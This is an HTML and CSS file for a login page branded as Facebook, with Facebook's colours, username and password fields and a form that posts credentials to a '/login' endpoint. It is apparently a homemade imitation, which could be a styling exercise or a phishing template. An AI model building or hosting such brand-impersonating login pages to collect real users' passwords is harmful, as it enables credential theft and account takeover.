<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1877f2, #42a5f5);
        }

        .container {
            width: 380px;
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
            text-align: center;
        }

        .logo {
            font-size: 42px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }

        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #1877f2;
        }

        button {
            width: 100%;
            padding: 15px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background: #1565d8;
        }

        .links {
            margin-top: 20px;
        }

        .links a {
            color: #1877f2;
            text-decoration: none;
        }

        .divider {
            margin: 25px 0;
            border-top: 1px solid #ddd;
        }

        .signup {
            background: #42b72a;
        }

        .signup:hover {
            background: #36a420;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">Facebook</div>

        <div class="subtitle">
            Connect with your friends and community.
        </div>

        <form action="/login" method="POST">

            <input
                type="text"
                name="username"
                placeholder="Email or username"
                required
            >

            <input
                type="password"
                name="password"
                placeholder="Password"
                required
            >

            <button type="submit">
                Log In
            </button>

            <div class="links">
                <a href="#">Forgot password?</a>
            </div>

            <div class="divider"></div>

            <button class="signup" type="button">
                Create New Account
            </button>

        </form>
    </div>
</body>
</html>
